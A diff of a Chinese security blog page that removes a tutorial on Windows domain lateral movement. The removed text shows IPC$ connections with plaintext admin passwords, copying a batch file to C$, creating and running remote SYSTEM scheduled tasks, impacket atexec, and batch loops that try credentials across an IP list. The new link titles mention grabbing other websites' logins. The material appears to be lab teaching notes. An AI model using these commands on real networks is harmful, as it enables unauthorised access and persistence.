@@ -3,7 +3,7 @@
 
 	<head>
 		
-<title>小迪安全系列-[计划任务impacket]-军军Z1</title>
+<title>内网系列-[IPC入侵机房]-军军Z1</title>
   <meta name="generator" content="hexo-theme-ayer">
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -260,7 +260,7 @@
         <ul class="tag">
             
         </ul>
-        <h1>小迪安全系列-[计划任务impacket]</h1>
+        <h1>内网系列-[IPC入侵机房]</h1>
         <div class="article-info">
             <div class="article-author">
                 
@@ -273,53 +273,14 @@
                 </svg>
                 
                 <span> <a href="">军军Z1</a></span>
-                <p>2022-05-02 12:16:15</p>
+                <p>2022-04-13 01:59:07</p>
             </div>
         </div>
     </div>
 </div>
 <div class="article-content">
     <div id="article" class="content">
-        <h1><span id="域横向atampschtasksampimpacket">域横向at&amp;schtasks&amp;impacket</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-横向渗透明文传递 at&amp;schtasks<br>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？<br>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主<br>机上执行命令。<br>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户<br>名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或<br>者相关命令<br>利用流程<br>1. 建立 IPC 链接到目标主机<br>2. 拷贝要执行的命令脚本到目标主机<br>3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br></code></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-<h1><span id="计划任务at">计划任务——AT</span></h1><p>注：at命令仅仅适用于win8以下系统，win8和win8以上已弃用</p>
-<p>1.创建本地IPC链接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">net use \\192.168.3.21\ipc$ Admin12345 /user:administrator<br></code></pre></td></tr></table></figure>
-
-<p>2.拷贝要执行的命令脚本到目标主机</p>
-<p><img src="/../../images/xdnwaq/d1639495713473.png" alt="1639495713473"></p>
-<p>3.查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</p>
-<p><img src="/../../images/xdnwaq/16394957436174.png" alt="1639495736174"></p>
-<h1><span id="计划任务schtasks">计划任务——schtasks</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#schtasks &gt;=Windows2012<br>net use \\192.168.3.32\ipc$ &quot;admin!@#45&quot; /user:god.org\ad<br>ministrator # 建立 ipc 连接：<br>copy add.bat \\192.168.3.32\c$ #复制文件到其 C 盘<br>schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn adduser /sc DAILY /tr c:\add.bat /F #创建 adduser 任务<br>对应执行文件<br>schtasks /run /s 192.168.3.32 /tn adduser /i #运行 adduser 任务<br>schtasks /delete /s 192.168.3.21 /tn adduser /f#删除 adduser 任务<br></code></pre></td></tr></table></figure>
-
-<p>1.创建任务</p>
-<p>schtasks &#x2F;create &#x2F;s 192.168.1.146 &#x2F;ru “SYSTEM” &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr c:\add.bat &#x2F;F </p>
-<p>&#x2F;ru “SYSTEM”                        权限</p>
-<p> &#x2F;tn adduser                        计时任务的名字 </p>
-<p>&#x2F;sc DAILY &#x2F;tr c:\add.bat     延迟执行文件地址</p>
-<p><img src="/../../images/xdnwaq/16394986174427.png" alt="1639498617427"></p>
-<p>2.运行adduser 任务</p>
-<p>schtasks &#x2F;run &#x2F;s 192.168.3.32 &#x2F;tn adduser &#x2F;i</p>
-<p><img src="/../../images/xdnwaq/16394984666812.png" alt="1639498666812"></p>
-<p>3.删除add user任务</p>
-<p> schtasks &#x2F;delete &#x2F;s 192.168.3.21 &#x2F;tn adduser &#x2F;f#删除 adduser 任务 </p>
-<h1><span id="atexec-impacket">atexec-impacket</span></h1><p><strong>atexec.exe [用户名] ：[密码] @ [IP] [命令]</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;<br></code></pre></td></tr></table></figure>
-
-<p><img src="/../../images/xdnwaq/16395840214846.png" alt="1639584021846"></p>
-<h1><span id="atexecexe批量连接"><strong>atexec.exe批量连接</strong></span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%%i whoami<br></code></pre></td></tr></table></figure>
-
-<p><img src="/../../images/xdnwaq/1651470706485.png" alt="1651470706485"></p>
-<h1><span id="net-use批量连接"><strong>net use批量连接</strong></span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;Admin12345&quot; /user:administrator<br></code></pre></td></tr></table></figure>
-
-<p><img src="/../../images/xdnwaq/1639590175450.png" alt="1639590175450"></p>
-
+        
     </div>
 </div>
 <style>
@@ -348,12 +309,19 @@
 </script>
 <div class="Last-Next">
     
+    <a href="/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/">
+        <div class="last">
+            <span>上一篇</span>
+            <p>内网安全系列-[ARP欺骗]</p>
+        </div>
+    </a>
+    
 
     
-    <a href="/2022/05/02/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/%E7%BC%96%E7%A8%8B%E7%B3%BB%E5%88%97%5Bpython%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%5D/">
+    <a href="/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/">
         <div class="next">
             <span>下一篇</span>
-            <p>编程系列[python黑客编程]</p>
+            <p>WEB实战系列-[手工获取外网网站登录名和密码]</p>
         </div>
     </a>
     
